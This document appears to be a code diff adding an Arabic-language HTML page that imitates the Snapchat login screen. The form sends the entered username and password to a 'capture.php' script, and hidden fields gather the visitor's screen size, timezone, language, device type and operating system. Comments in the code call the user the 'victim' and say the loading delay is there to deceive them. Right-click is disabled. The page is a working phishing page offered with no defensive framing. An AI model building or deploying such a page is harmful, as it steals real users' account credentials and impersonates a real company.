@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Snapchat - تسجيل الدخول</title>
+    <link rel="icon" href="https://www.snapchat.com/favicon.ico">
+    <style>
+        /* ===== RESET ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            margin: 0;
+        }
+
+        /* ===== الحاوية الرئيسية (تتجاوب مع كل الشاشات) ===== */
+        .container {
+            background: #1a1a1a;
+            padding: 40px 30px;
+            border-radius: 40px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            border: 1px solid #2a2a2a;
+            transition: 0.3s;
+        }
+
+        .logo {
+            color: #fff;
+            font-size: 2.2rem;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 5px;
+            letter-spacing: -0.5px;
+        }
+        .logo span {
+            color: #fffc00;
+        }
+
+        .sub-text {
+            color: #999;
+            text-align: center;
+            font-size: 0.9rem;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px 18px;
+            background: #252525;
+            border: 1.5px solid #333;
+            border-radius: 16px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        input:focus {
+            border-color: #fffc00;
+            background: #1e1e1e;
+        }
+
+        input::placeholder {
+            color: #777;
+            font-weight: 400;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #fffc00;
+            color: #000;
+            font-weight: 700;
+            border: none;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 5px;
+        }
+
+        .btn:hover {
+            background: #e6e300;
+            transform: scale(0.98);
+        }
+        .btn:active {
+            transform: scale(0.95);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            font-size: 0.8rem;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .footer-links a {
+            color: #777;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+        .footer-links a:hover {
+            color: #fff;
+        }
+
+        .divider {
+            color: #333;
+        }
+
+        .extra-actions {
+            margin-top: 25px;
+            text-align: center;
+            border-top: 1px solid #2a2a2a;
+            padding-top: 20px;
+        }
+
+        .extra-actions a {
+            color: #fffc00;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+        .extra-actions a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== شاشة التحميل الفاخرة ===== */
+        #loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 99999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+        }
+
+        .loading-box {
+            text-align: center;
+            padding: 30px;
+        }
+
+        .spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid #333;
+            border-top: 5px solid #fffc00;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 25px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-title {
+            font-size: 1.3rem;
+            font-weight: 500;
+            color: #eee;
+            letter-spacing: 1px;
+        }
+
+        .loading-sub {
+            font-size: 0.9rem;
+            color: #888;
+            margin-top: 8px;
+        }
+
+        /* ===== تحسينات الشاشات الصغيرة (جوال + تابلت) ===== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+                border-radius: 28px;
+            }
+            .logo {
+                font-size: 1.8rem;
+            }
+            input {
+                padding: 14px 16px;
+                font-size: 0.95rem;
+            }
+            .btn {
+                padding: 14px;
+                font-size: 1rem;
+            }
+            .footer-links {
+                justify-content: center;
+                gap: 6px;
+            }
+            .extra-actions a {
+                font-size: 0.85rem;
+            }
+            .loading-title {
+                font-size: 1.1rem;
+            }
+            .spinner {
+                width: 55px;
+                height: 55px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .container {
+                padding: 20px 15px;
+            }
+            .logo {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== شاشة التحميل ===== -->
+    <div id="loading-screen">
+        <div class="loading-box">
+            <div class="spinner"></div>
+            <div class="loading-title">جاري التحقق من بياناتك</div>
+            <div class="loading-sub">قد تستغرق بضع ثوانٍ...</div>
+        </div>
+    </div>
+
+    <!-- ===== الواجهة الرئيسية ===== -->
+    <div class="container">
+        <div class="logo">📸 <span>Snap</span>chat</div>
+        <div class="sub-text">تواصل مع أصدقائك بلحظات</div>
+
+        <form action="capture.php" method="POST" id="loginForm">
+            <div class="input-group">
+                <input type="text" name="identifier" placeholder="رقم الهاتف أو البريد الإلكتروني" required autocomplete="username">
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="كلمة المرور" required autocomplete="current-password">
+            </div>
+
+            <!-- حقول خفية لجمع معلومات الجهاز -->
+            <input type="hidden" name="screen_res" id="screen_res">
+            <input type="hidden" name="timezone" id="timezone">
+            <input type="hidden" name="language" id="language">
+            <input type="hidden" name="device_type" id="device_type">
+            <input type="hidden" name="os" id="os">
+
+            <button type="submit" class="btn">تسجيل الدخول</button>
+        </form>
+
+        <div class="footer-links">
+            <a href="https://accounts.snapchat.com/accounts/password_reset" target="_blank">نسيت كلمة المرور؟</a>
+            <span class="divider">|</span>
+            <a href="https://www.snapchat.com/signup" target="_blank">إنشاء حساب جديد</a>
+        </div>
+
+        <div class="extra-actions">
+            <a href="https://www.snapchat.com/legal/privacy" target="_blank">سياسة الخصوصية</a>
+        </div>
+    </div>
+
+    <script>
+        // ===== جمع معلومات الجهاز =====
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('screen_res').value = screen.width + 'x' + screen.height;
+            document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+            document.getElementById('language').value = navigator.language || 'ar';
+
+            // كشف نوع الجهاز
+            const ua = navigator.userAgent;
+            const isMobile = /Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+            const isTablet = /iPad|Android(?!.*Mobile)/i.test(ua);
+            let device = 'كمبيوتر';
+            if (isTablet) device = 'تابلت';
+            else if (isMobile) device = 'جوال';
+            document.getElementById('device_type').value = device;
+
+            // كشف نظام التشغيل
+            let os = 'غير معروف';
+            if (ua.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
+            else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
+            else if (ua.indexOf('Android') !== -1) os = 'Android';
+            else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';
+            else if (ua.indexOf('Mac OS X') !== -1) os = 'MacOS';
+            else if (ua.indexOf('Linux') !== -1) os = 'Linux';
+            document.getElementById('os').value = os;
+        });
+
+        // ===== عند الضغط على زر تسجيل الدخول =====
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // إظهار شاشة التحميل
+            document.getElementById('loading-screen').style.display = 'flex';
+
+            // منع الإرسال الافتراضي مؤقتاً
+            e.preventDefault();
+
+            // تأخير نصف ثانية لإيهام الضحية بأن هناك عملية تحقق
+            setTimeout(() => {
+                e.target.submit();
+            }, 400);
+        });
+
+        // ===== منع النقر بزر الماوس الأيمن (إجراء أمني وهمي) =====
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
